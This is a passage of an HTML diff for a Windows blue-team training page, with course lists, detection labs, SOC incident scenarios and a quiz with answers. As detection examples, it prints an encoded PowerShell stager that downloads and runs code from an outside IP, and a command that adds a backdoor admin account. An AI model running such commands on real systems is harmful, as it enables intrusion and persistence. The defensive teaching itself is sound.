+<tr><td>Breaching Active Directory</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Initial AD attack vectors: password spray, LLMNR/NBT-NS poisoning</td><td>5th</td></tr>
+<tr><td>Attacktive Directory</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Full AD compromise simulation (Kerberoasting, Golden Ticket)</td><td>6th</td></tr>
+<tr><td>Post-Exploitation Basics</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Windows post-exploitation: persistence, lateral movement, data theft</td><td>7th</td></tr>
+<tr><td>Sysmon</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Install, configure, and analyze Sysmon logs for malicious activity</td><td>8th</td></tr>
+<tr><td>Windows Event Logs</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Parse and analyze Security, System, and PowerShell event logs</td><td>9th</td></tr>
+<tr><td>Investigating Windows</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Forensic investigation of compromised Windows machine</td><td>10th</td></tr>
+<tr><td>Windows Internals</td><td><span class="badge bg-danger">Hard</span></td><td>Process structure, memory management, kernel objects</td><td>11th</td></tr>
+<tr><td>Windows Forensics 1</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Prefetch, Amcache, Shimcache, Registry, $MFT analysis</td><td>12th</td></tr>
+<tr><td>Windows Forensics 2</td><td><span class="badge bg-danger">Hard</span></td><td>Volume shadow copies, USN journal, jump lists, SRUM</td><td>13th</td></tr>
+</tbody>
+</table>
 </div>
+
+<!-- HTB ACADEMY -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-laptop me-2"></i>Hack The Box Academy</h5>
+<div class="table-responsive">
+<table class="table table-dark table-sm small" style="color:#c0d0e0;">
+<thead><tr><th>Module</th><th>Difficulty</th><th>Outcomes</th></tr></thead>
+<tbody>
+<tr><td>Introduction to Windows</td><td><span class="badge bg-success">Easy</span></td><td>Windows OS architecture, file system, registry, processes, services</td></tr>
+<tr><td>Windows Event Logs &amp; Finding Evil</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Analyze Windows Event Logs for attacks; Event IDs, Sysmon, PowerShell logging</td></tr>
+<tr><td>Active Directory LDAP</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>LDAP protocol, AD enumeration, querying AD for security analysis</td></tr>
+<tr><td>Introduction to Active Directory</td><td><span class="badge bg-danger">Hard</span></td><td>AD architecture, Kerberos, NTLM, authentication protocol analysis</td></tr>
+<tr><td>Windows Forensics</td><td><span class="badge bg-danger">Hard</span></td><td>Memory forensics, registry analysis, timeline creation, artifact extraction</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- LETSDEFEND -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-shield-check me-2"></i>LetsDefend Investigations</h5>
+<div class="table-responsive">
+<table class="table table-dark table-sm small" style="color:#c0d0e0;">
+<thead><tr><th>Investigation</th><th>Type</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>SOC002 - Malicious PowerShell</td><td>Alert Triage</td><td>Analyze PowerShell script block logging (Event ID 4104) for encoded malicious command</td></tr>
+<tr><td>SOC008 - Pass-the-Hash</td><td>Incident Response</td><td>Identify PtH from Event ID 4624 logon type 3 anomalies across multiple servers</td></tr>
+<tr><td>SOC014 - Ransomware Execution</td><td>Incident Response</td><td>Investigate mass file encryption via Sysmon Event 11; identify patient zero</td></tr>
+<tr><td>SOC022 - LSASS Credential Dump</td><td>Forensic Analysis</td><td>Detect lsass.exe process access via Sysmon Event 10; identify dumping tool</td></tr>
+<tr><td>SOC031 - Scheduled Task Backdoor</td><td>Threat Hunting</td><td>Find malicious scheduled task created for persistence via Event ID 4698</td></tr>
+<tr><td>SOC042 - DCSync Attack Detection</td><td>Active Directory</td><td>Detect DCSync via Event ID 4662 directory service access from non-DC host</td></tr>
+<tr><td>SOC050 - WMI Lateral Movement</td><td>Incident Response</td><td>Identify WMI-based lateral movement using WmiPrvSE.exe process creation</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- CYBERDEFENDERS -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-shield me-2"></i>CyberDefenders Blue Team Challenges</h5>
+<div class="table-responsive">
+<table class="table table-dark table-sm small" style="color:#c0d0e0;">
+<thead><tr><th>Challenge</th><th>Difficulty</th><th>Focus</th></tr></thead>
+<tbody>
+<tr><td>Brutus - Windows Log Analysis</td><td><span class="badge bg-success">Easy</span></td><td>Analyze Windows Security logs for brute force attempt against RDP (Event ID 4625)</td></tr>
+<tr><td>Dana - PowerShell Forensics</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Analyze PowerShell logs, deobfuscate script blocks, identify C2 communication</td></tr>
+<tr><td>Heuristic - Sysmon Analysis</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Parse Sysmon logs to reconstruct attack chain from initial access to data exfiltration</td></tr>
+<tr><td>Titan - Memory Forensics</td><td><span class="badge bg-danger">Hard</span></td><td>Analyze Windows memory dump with Volatility; find injected code, rootkit, stolen credentials</td></tr>
+<tr><td>Zeus - Full Incident Response</td><td><span class="badge bg-danger">Hard</span></td><td>Complete IR: disk forensics, memory analysis, log correlation, timeline, report writing</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- GITHUB RESOURCES -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-github me-2"></i>GitHub Resources</h5>
+<div class="row g-2 mb-3">
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/keraattin/Blue-Team-Roadmap" target="_blank" style="color:#00d4ff;">Blue-Team-Roadmap</a></strong><br>
+<span style="color:#c0d0e0;">Windows security section: Event Log analysis, Sysmon, Windows Defender, Attack Surface Reduction rules. Skills: Windows forensic methodology.</span>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/cyb3rxp/awesome-soc" target="_blank" style="color:#00d4ff;">awesome-soc</a></strong><br>
+<span style="color:#c0d0e0;">Windows SOC tools: Sysmon, Winlogbeat, Velociraptor, Hayabusa, Chainsaw. Skills: Tool selection for Windows endpoint monitoring.</span>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/SigmaHQ/sigma" target="_blank" style="color:#00d4ff;">Sigma</a></strong><br>
+<span style="color:#c0d0e0;">Extensive Windows-focused Sigma rules: Sysmon detections for process injection, credential dumping, lateral movement. Skills: Windows detection engineering.</span>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/redcanaryco/atomic-red-team" target="_blank" style="color:#00d4ff;">Atomic Red Team</a></strong><br>
+<span style="color:#c0d0e0;">Windows atomic tests for all major techniques: T1134 (Access Token Manipulation), T1055 (Process Injection), T1003 (Credential Dumping). Skills: Testing Windows detections.</span>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/SwiftOnSecurity/sysmon-config" target="_blank" style="color:#00d4ff;">sysmon-config</a></strong><br>
+<span style="color:#c0d0e0;">The most widely used Sysmon configuration. Covers process creation, network connections, DLL loading, registry changes, file creation. Skills: Sysmon deployment and tuning.</span>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/aboutsecurity/blueteam_homelabs" target="_blank" style="color:#00d4ff;">blueteam_homelabs</a></strong><br>
+<span style="color:#c0d0e0;">Homelab guides for setting up Windows domain with Sysmon, WEF, and SIEM integration. Skills: Active Directory lab with security monitoring.</span>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES" target="_blank" style="color:#00d4ff;">EVTX-ATTACK-SAMPLES</a></strong><br>
+<span style="color:#c0d0e0;">Windows EVTX samples for every MITRE ATT&CK technique. Practice reading log evidence of real attacks. Skills: Hands-on Windows log analysis.</span>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/InQuest/awesome-yara" target="_blank" style="color:#00d4ff;">awesome-yara</a></strong><br>
+<span style="color:#c0d0e0;">YARA rules for Windows malware (PE files, Office macros, PowerShell scripts). Skills: Writing YARA rules for Windows-specific threats.</span>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bg-dark p-2 rounded small" style="border:1px solid #333;height:100%;">
+<strong><i class="bi bi-link-45deg me-1"></i> <a href="https://github.com/A-poc/BlueTeam-Tools" target="_blank" style="color:#00d4ff;">BlueTeam-Tools</a></strong><br>
+<span style="color:#c0d0e0;">Windows blue team tools: Sysmon, Hayabusa (EVTX parser), Chainsaw (rapid threat detection), Velociraptor (DFIR). Skills: Tool deployment and IR workflow.</span>
+</div>
+</div>
+</div>
+
+<!-- HANDS-ON LABS -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-tools me-2"></i>Hands-On Labs</h5>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-1-circle me-1"></i> Beginner Lab: Windows Event Log Analysis — Failed RDP Logins</p>
+<p style="color:#c0d0e0;"><strong>Objectives:</strong> Use Event Viewer and PowerShell to find failed RDP login attempts (Event ID 4625, Logon Type 10) from external IPs and identify brute force patterns.</p>
+<p style="color:#c0d0e0;"><strong>Setup:</strong> Windows 10/11 or Windows Server VM. Generate some failed RDP attempts or download a sample .evtx from https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES.</p>
+<p style="color:#c0d0e0;"><strong>Step-by-Step:</strong></p>
+<ol style="color:#c0d0e0;">
+<li>Open Event Viewer: <code>eventvwr.msc</code></li>
+<li>Navigate to: <code>Windows Logs → Security</code></li>
+<li>Filter current log: Right-click → Filter Current Log → Event ID: 4625</li>
+<li>Observe the fields: Account Name, Source Network Address, Logon Type</li>
+<li>Now use PowerShell for analysis:</li>
+</ol>
+<pre style="background:#0d1117;border:1px solid #333;padding:8px;color:#c0d0e0;font-size:0.8rem;">
+# Get failed logins (Event ID 4625) for RDP (Logon Type 10)
+$events = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} | `
+    Where-Object {$_.Properties[8].Value -eq 10} | `
+    Select-Object TimeCreated, `
+        @{N='User';E={$_.Properties[5].Value}}, `
+        @{N='SourceIP';E={$_.Properties[18].Value}}
+
+# Group by source IP and count
+$events | Group-Object SourceIP | Sort-Object Count -Descending | `
+    Select-Object Count, Name | Format-Table -AutoSize
+
+# Group by username
+$events | Group-Object User | Sort-Object Count -Descending | `
+    Select-Object Count, Name | Format-Table -AutoSize
+
+# Export to CSV for reporting
+$events | Export-Csv -Path "failed_rdp.csv" -NoTypeInformation
+</pre>
+<ol start="6">
+<li style="color:#c0d0e0;">Check for successful RDP from the same IP: <code>Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Where-Object {$_.Properties[8].Value -eq 10 -and $_.Properties[18].Value -eq '10.0.0.5'} | Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}</code></li>
+</ol>
+<p style="color:#c0d0e0;"><strong>Expected Results:</strong> You'll see multiple failed RDP attempts from external IPs with usernames like admin, Administrator, user, test. If any successful logins follow a brute force pattern, the account is compromised.</p>
+<p style="color:#c0d0e0;"><strong>Troubleshooting:</strong> If no 4625 events, check if auditing is enabled: <code>auditpol /get /category:"Account Logon"</code>. Enable: <code>auditpol /set /subcategory:"Logon" /success:enable /failure:enable</code>.</p>
+<p style="color:#c0d0e0;"><strong>Detection Opportunities:</strong> SIEM rule: 10+ failed RDP logins from same IP in 5 minutes → alert. Account lockout policy should trigger after 5 failed attempts. Geo-IP block RDP from non-approved countries.</p>
+</div>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-2-circle me-1"></i> Intermediate Lab: Deploy Sysmon and Detect Process Injection</p>
+<p style="color:#c0d0e0;"><strong>Objectives:</strong> Install Sysmon with a config, generate process injection activity using Cobalt Strike or Atomic Red Team, and detect it via Sysmon Event ID 8 (CreateRemoteThread).</p>
+<p style="color:#c0d0e0;"><strong>Setup:</strong> Windows 10/11 VM. Download Sysmon from Microsoft Sysinternals. Download SwiftOnSecurity sysmon-config. Download Atomic Red Team.</p>
+<p style="color:#c0d0e0;"><strong>Step-by-Step:</strong></p>
+<ol style="color:#c0d0e0;">
+<li>Download Sysmon: <code>curl -o Sysmon64.zip https://download.sysinternals.com/files/Sysmon.zip</code></li>
+<li>Extract and install with SwiftOnSecurity config: <code>Sysmon64.exe -accepteula -i sysmon-config.xml</code></li>
+<li>Verify installation: <code>Get-Service Sysmon64</code></li>
+<li>View Sysmon logs: Event Viewer → Applications and Services → Microsoft → Windows → Sysmon → Operational</li>
+<li>Generate process injection using Atomic Red Team:</li>
+</ol>
+<pre style="background:#0d1117;border:1px solid #333;padding:8px;color:#c0d0e0;font-size:0.8rem;">
+# Install Atomic Red Team
+Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force
+Install-AtomicRedTeam -GetPrereqs
+
+# Run process injection test (T1055.001 - DLL Injection)
+Invoke-AtomicTest T1055.001 -TestNumbers 1
+</pre>
+<ol start="6">
+<li style="color:#c0d0e0;">Check Sysmon Event ID 8 in Event Viewer or query with PowerShell:</li>
+</ol>
+<pre style="background:#0d1117;border:1px solid #333;padding:8px;color:#c0d0e0;font-size:0.8rem;">
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=8} | `
+    Select-Object TimeCreated, `
+        @{N='SourceProcess';E={$_.Properties[1].Value}}, `
+        @{N='TargetProcess';E={$_.Properties[4].Value}}, `
+        @{N='SourcePID';E={$_.Properties[3].Value}}, `
+        @{N='TargetPID';E={$_.Properties[5].Value}}, `
+        @{N='StartModule';E={$_.Properties[6].Value}}, `
+        @{N='StartFunction';E={$_.Properties[7].Value}} | `
+    Format-Table -AutoSize
+</pre>
+<p style="color:#c0d0e0;"><strong>Expected Results:</strong> Sysmon Event ID 8 will show a legitimate process (e.g., notepad.exe) creating a remote thread in another process. The StartModule shows kernel32.dll, StartFunction shows LoadLibraryA — classic DLL injection pattern.</p>
+<p style="color:#c0d0e0;"><strong>Troubleshooting:</strong> If no Event ID 8, ensure your sysmon-config includes CreateRemoteThread rules. Check Atomic Red Team prerequisites are installed. Try running as Administrator.</p>
+<p style="color:#c0d0e0;"><strong>Detection Opportunities:</strong> In production, alert on Sysmon Event ID 8 where SourceProcess is an Office app or browser spawning threads in SYSTEM processes. Create exceptions for legitimate software (AV, backup tools).</p>
+</div>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-3-circle me-1"></i> Advanced Lab: Full Windows Incident Response — Ransomware Simulation</p>
+<p style="color:#c0d0e0;"><strong>Objectives:</strong> Simulate a ransomware attack, collect all forensic artifacts (event logs, memory, prefetch, registry), analyze the attack timeline, and write a complete incident report.</p>
+<p style="color:#c0d0e0;"><strong>Setup:</strong> Windows 10 VM with Sysmon installed. Use a ransomware simulator (like RanSim or Atomic Red Team T1486). Ensure VM has snapshots (this destroys data).</p>
+<p style="color:#c0d0e0;"><strong>Step-by-Step:</strong></p>
+<ol style="color:#c0d0e0;">
+<li><strong>Prepare forensic tools:</strong> Download KAPE (Kroll Artifact Parser and Extractor), Volatility 3, Zimmerman's Tools on a separate analysis VM.</li>
+<li><strong>Execute ransomware simulation:</strong> Run Atomic Red Team T1486 test: <code>Invoke-AtomicTest T1486 -TestNumbers 1</code></li>
+<li><strong>Collect live evidence (order of volatility):</strong></li>
+</ol>
+<pre style="background:#0d1117;border:1px solid #333;padding:8px;color:#c0d0e0;font-size:0.8rem;">
+# 1. Capture RAM
+# Download Avml64.exe
+.\avml64.exe memory.raw
+
+# 2. Capture process list
+Get-Process | Export-Csv -Path processes.csv -NoTypeInformation
+
+# 3. Capture network connections
+netstat -anob > network_connections.txt
+
+# 4. Capture open files by processes
+& C:\Windows\System32\handle64.exe -accepteula -a > handles.txt
+
+# 5. Export all Sysmon and Security logs
+wevtutil epl "Microsoft-Windows-Sysmon/Operational" sysmon.evtx
+wevtutil epl Security security.evtx
+wevtutil epl "Windows PowerShell" powershell.evtx
+</pre>
+<ol start="4">
+<li style="color:#c0d0e0;"><strong>Collect disk artifacts with KAPE:</strong> <code>.\kape.exe --tsource C: --tdest C:\evidence --tflush</code></li>
+<li style="color:#c0d0e0;"><strong>Analyze memory with Volatility 3:</strong></li>
+</ol>
+<pre style="background:#0d1117;border:1px solid #333;padding:8px;color:#c0d0e0;font-size:0.8rem;">
+# Process list
+volatility -f memory.raw windows.pslist
+
+# Process tree
+volatility -f memory.raw windows.pstree
+
+# Detect injected code
+volatility -f memory.raw windows.malfind
+
+# Check cmdline arguments
+volatility -f memory.raw windows.cmdline
+
+# Extract network connections
+volatility -f memory.raw windows.netscan
+
+# Dump suspicious process for analysis
+volatility -f memory.raw windows.dumpfiles --pid 1337
+</pre>
+<ol start="6">
+<li style="color:#c0d0e0;"><strong>Analyze timeline:</strong> Use KAPE output with TimelineExplorer to visualize events second-by-second.</li>
+</ol>
+<p style="color:#c0d0e0;"><strong>Expected Results:</strong> You'll reconstruct the attack: initial process (powershell.exe) → download payload → file encryption → persistence via registry Run key → C2 communication. Sysmon logs show: Event 1 (process creation), Event 11 (file create — .encrypted files), Event 3 (network connection to C2), Event 12/13 (registry persistence).</p>
+<p style="color:#c0d0e0;"><strong>Troubleshooting:</strong> If Volatility malfind shows no results, the injection may use a different technique (process hollowing — check for mismatch between process name and path). Use <code>windows.ldrmodules</code> to detect hidden modules. If RAM capture fails, use <code>DumpIt.exe</code> from Comae.</p>
+<p style="color:#c0d0e0;"><strong>Detection Opportunities:</strong> Deploy EDR (CrowdStrike, SentinelOne, Defender for Endpoint) for automated ransomware detection. Create Sigma rules for the specific ransomware behavior. Implement honeypot files (canary files) that trigger alerts when accessed/modified.</p>
+</div>
+
+<!-- SOC SCENARIOS -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-shield-fill-exclamation me-2"></i>SOC Scenarios</h5>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-1-circle me-1"></i> Scenario 1: Pass-the-Hash Attack on Domain Admin</p>
+<p style="color:#c0d0e0;"><strong>What Happened:</strong> Splunk alert: "Possible Pass-the-Hash" — Event ID 4624 Logon Type 3 (Network) from workstation WS-045 (10.0.2.45) to DC-01 (10.0.0.10) using domain admin account "jdoe_da" at 03:00 UTC. User jdoe was logged off since 17:00 UTC the previous day.</p>
+<p style="color:#c0d0e0;"><strong>How to Detect:</strong> Splunk query: <code>index=windows EventCode=4624 LogonType=3 AccountName="jdoe_da" | stats count by SourceIP, dest, time | sort time</code>. The single logon event from a non-DC host to the DC using a privileged account at an off-hour is suspicious.</p>
+<p style="color:#c0d0e0;"><strong>How to Investigate:</strong></p>
+<ol style="color:#c0d0e0;">
+<li>Check workstation WS-045 for compromise: review Sysmon logs for WS-045 — was there a credential dumping tool? (Event ID 10: ProcessAccess to lsass.exe)</li>
+<li>Check if WS-045 had any other anomalous connections (lateral movement from WS-045 to other servers)</li>
+<li>Check what commands were executed on DC-01 after the login: Event ID 4688 on DC-01 with parent PID of the logon session</li>
+<li>Check if any DCSync activity followed: Event ID 4662 (Directory Service Access)</li>
+<li>Verify user jdoe_da's MFA status — was it registered? MFA should prevent PtH</li>
+</ol>
+<p style="color:#c0d0e0;"><strong>How to Respond:</strong></p>
+<ul style="color:#c0d0e0;">
+<li>Immediately disable jdoe_da account and force password reset</li>
+<li>Isolate WS-045 from network for forensic analysis</li>
+<li>Check all servers DC-01 connected to for lateral movement</li>
+<li>Rotate krbtgt password twice (to invalidate any forged Golden Tickets)</li>
+<li>Deploy Credential Guard and Windows Defender for Identity on all DCs</li>
+<li>Enable Restricted Admin mode for RDP</li>
+</ul>
+<p style="color:#c0d0e0;"><strong>How to Document:</strong> "Pass-the-Hash attack detected on DC-01 from compromised workstation WS-045. Attacker used domain admin credential (jdoe_da) via NTLM network logon. Evidence: Event ID 4624 Logon Type 3 at 03:00 UTC from non-origin host. Root cause: credential dumping from WS-045 (Sysmon Event 10 — lsass access by procdump.exe). No DCSync observed. MITRE ATT&CK: T1550.002 (Pass the Hash), T1003.001 (LSASS Memory). Severity: CRITICAL."</p>
+</div>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-2-circle me-1"></i> Scenario 2: PowerShell Empire C2 Beaconing</p>
+<p style="color:#c0d0e0;"><strong>What Happened:</strong> EDR alert on workstation WK-102: "PowerShell made network connection to 51.15.43.142:443 at 2-minute intervals." The PowerShell process has no parent console window and is running from a hidden window.</p>
+<p style="color:#c0d0e0;"><strong>How to Detect:</strong> Sysmon Event ID 3 shows powershell.exe connecting to 51.15.43.142:443. Event ID 4104 (PowerShell Script Block Logging) captures the deobfuscated Empire stager. Event ID 1 shows the PowerShell launch: <code>powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANQAxAC4AMQA1AC4ANAAzAC4AMQA0ADIAOgA0ADQAMwAvAGcAZQB0AGsAZQB5ACcAKQA=</code></p>
+<p style="color:#c0d0e0;"><strong>How to Investigate:</strong></p>
+<ol style="color:#c0d0e0;">
+<li>Decode the base64 command: <code>[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('encoded...'))</code></li>
+<li>Check the decoded payload — it's an Empire stager downloading and executing a Malleable C2 profile</li>
+<li>Check what other systems the same C2 IP has contacted (scan firewall/Proxy logs)</li>
+<li>Check the user's email history — likely a phishing email with malicious macro or link</li>
+<li>Check for persistence mechanisms: scheduled tasks, WMI subscriptions, registry Run keys</li>
+<li>Check if the Empire agent executed any additional modules (keylogger, screenshot, credential collection)</li>
+</ol>
+<p style="color:#c0d0e0;"><strong>How to Respond:</strong></p>
+<ul style="color:#c0d0e0;">
+<li>Isolate WK-102 immediately</li>
+<li>Kill the PowerShell process tree and remove persistence</li>
+<li>Block 51.15.43.142 at the firewall</li>
+<li>Check for data exfiltration — did the attacker steal credentials or data?</li>
+<li>Implement PowerShell Constrained Language Mode via GPO</li>
+<li>Deploy AMSI (Antimalware Scan Interface) enabled AV</li>
+<li>User awareness training for phishing detection</li>
+</ul>
+<p style="color:#c0d0e0;"><strong>How to Document:</strong> "PowerShell Empire C2 beacon detected on WK-102. Stager downloaded from 51.15.43.142:443. Persistence via scheduled task 'WindowsUpdateTask'. Empire agent executed keylogger and uploaded keystroke logs (5000+ captured). No lateral movement detected. Root cause: phishing email with malicious macro (PhishID: PH-2025-042). MITRE ATT&CK: T1059.001 (PowerShell), T1005 (Data from Local System). Severity: HIGH."</p>
+</div>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-3-circle me-1"></i> Scenario 3: PrinterNightmare Exploitation (CVE-2021-34527)</p>
+<p style="color:#c0d0e0;"><strong>What Happened:</strong> SIEM alert: "Spoolsv.exe spawning cmd.exe" on print-server (10.0.3.15). Event ID 4688 shows spoolsv.exe (PID 1234) spawning cmd.exe (PID 5678) with arguments to add a new local admin user.</p>
+<p style="color:#c0d0e0;"><strong>How to Detect:</strong> Sysmon Event ID 1: ParentImage: <code>C:\Windows\System32\spoolsv.exe</code>, Image: <code>C:\Windows\System32\cmd.exe</code>, CommandLine: <code>cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add</code>. Event ID 4720 (user created) and 4732 (user added to admin group) follow.</p>
+<p style="color:#c0d0e0;"><strong>How to Investigate:</strong></p>
+<ol style="color:#c0d0e0;">
+<li>Check if the print server was exposed to the internet — PrinterNightmare is remotely exploitable</li>
+56<li>Check firewall logs for incoming connections to port 445 (SMB) from external IPs</li>
+<li>Check if the exploit was launched from another internal host (lateral movement source)</li>
+<li>Check the hacker account creation time and immediate actions taken</li>
+<li>Check if the attacker used the admin account to move laterally</li>
+<li>Review all Event ID 4624 logins from the new account</li>
+</ol>
+<p style="color:#c0d0e0;"><strong>How to Respond:</strong></p>
+<ul style="color:#c0d0e0;">
+<li>Disable the hacker account immediately</li>
+<li>Apply Microsoft's security patch for CVE-2021-34527 (KB5004945+)</li>
+<li>Disable the Print Spooler service on non-print servers: <code>Stop-Service Spooler; Set-Service Spooler -StartupType Disabled</code></li>
+<li>Block inbound SMB (port 445) from the internet</li>
+<li>Check all remaining servers for the spooler service running unnecessarily</li>
+<li>Review all accounts created in last 24 hours for suspicious patterns</li>
+</ul>
+<p style="color:#c0d0e0;"><strong>How to Document:</strong> "PrintNightmare exploitation (CVE-2021-34527) on print-server. spoolsv.exe spawned cmd.exe to create local admin account 'hacker'. Attacker IP: 198.51.100.89 (external). Exploit via unauthenticated SMB connection to print server. Account 'hacker' disabled, print spooler stopped, patch applied. No lateral movement detected. MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation), T1136.001 (Local Account). Severity: CRITICAL."</p>
+</div>
+
+<!-- KNOWLEDGE CHECK -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-question-lg me-2"></i>Knowledge Check</h5>
+
+<p class="fw-bold" style="color:#00d4ff;">Multiple Choice Questions (10)</p>
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<ol style="color:#c0d0e0;">
+<li><strong>Which Windows Event ID indicates a successful user logon?</strong><br>
+a) 4625 &nbsp;&nbsp; b) 4624 &nbsp;&nbsp; c) 4634 &nbsp;&nbsp; d) 4672<br>
+<em>Answer: b) 4624</em></li>
+
+<li><strong>What Sysmon Event ID detects remote thread creation (process injection)?</strong><br>
+a) Event 1 &nbsp;&nbsp; b) Event 7 &nbsp;&nbsp; c) Event 8 &nbsp;&nbsp; d) Event 10<br>
+<em>Answer: c) Event 8</em></li>
+
+<li><strong>Which Logon Type indicates RDP (Remote Interactive) login?</strong><br>
+a) Type 2 &nbsp;&nbsp; b) Type 3 &nbsp;&nbsp; c) Type 8 &nbsp;&nbsp; d) Type 10<br>
+<em>Answer: d) Type 10</em></li>
+
+<li><strong>What does Event ID 4769 (Kerberos) track that's critical for detecting Kerberoasting?</strong><br>
+a) TGT request &nbsp;&nbsp; b) Service ticket request &nbsp;&nbsp; c) Password change &nbsp;&nbsp; d) Account lockout<br>
+<em>Answer: b) Service ticket request</em></li>
+
+<li><strong>Which Windows process handles authentication and credential storage?</strong><br>
+a) winlogon.exe &nbsp;&nbsp; b) services.exe &nbsp;&nbsp; c) lsass.exe &nbsp;&nbsp; d) svchost.exe<br>
+<em>Answer: c) lsass.exe</em></li>
+
+<li><strong>What Event ID tracks service installation (used by PsExec)?</strong><br>
+a) 4698 &nbsp;&nbsp; b) 7045 &nbsp;&nbsp; c) 4720 &nbsp;&nbsp; d) 5145<br>
+<em>Answer: b) 7045</em></li>
+
+<li><strong>Which registry key is commonly used for malware persistence via Run keys?</strong><br>
+a) HKLM\System\CurrentControlSet\Services &nbsp;&nbsp; b) HKCU\Software\Microsoft\Windows\CurrentVersion\Run &nbsp;&nbsp; c) HKLM\SAM\SAM &nbsp;&nbsp; d) HKLM\Security\Policy<br>
+<em>Answer: b) HKCU\Software\Microsoft\Windows\CurrentVersion\Run</em></li>
+
+<li><strong>What does Sysmon Event ID 10 (ProcessAccess) typically indicate?</strong><br>
+a) A process started &nbsp;&nbsp; b) A process accessed another process (credential dumping) &nbsp;&nbsp; c) A DLL was loaded &nbsp;&nbsp; d) A registry key was modified<br>
+<em>Answer: b) A process accessed another process (credential dumping)</em></li>
+
+<li><strong>Which Windows Event ID captures script block content from PowerShell?</strong><br>
+a) 4688 &nbsp;&nbsp; b) 4103 &nbsp;&nbsp; c) 4104 &nbsp;&nbsp; d) 4702<br>
+<em>Answer: c) 4104</em></li>
+
+<li><strong>What is the primary detection mechanism for DCSync attacks?</strong><br>
+a) Event ID 4624 Logon Type 10 &nbsp;&nbsp; b) Event ID 4662 directory service access from non-DC &nbsp;&nbsp; c) Sysmon Event 1 process creation &nbsp;&nbsp; d) Event ID 4698 scheduled task<br>
+<em>Answer: b) Event ID 4662 directory service access from non-DC</em></li>
+</ol>
+</div>
+
+<p class="fw-bold" style="color:#00d4ff;">Practical Questions (5)</p>
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<ol style="color:#c0d0e0;">
+<li><strong>Event Log Analysis:</strong> Write a PowerShell script that parses the Security log for all account lockouts (Event ID 4740) in the last 24 hours and outputs the account name, source IP, and timestamp to a CSV file.</li>
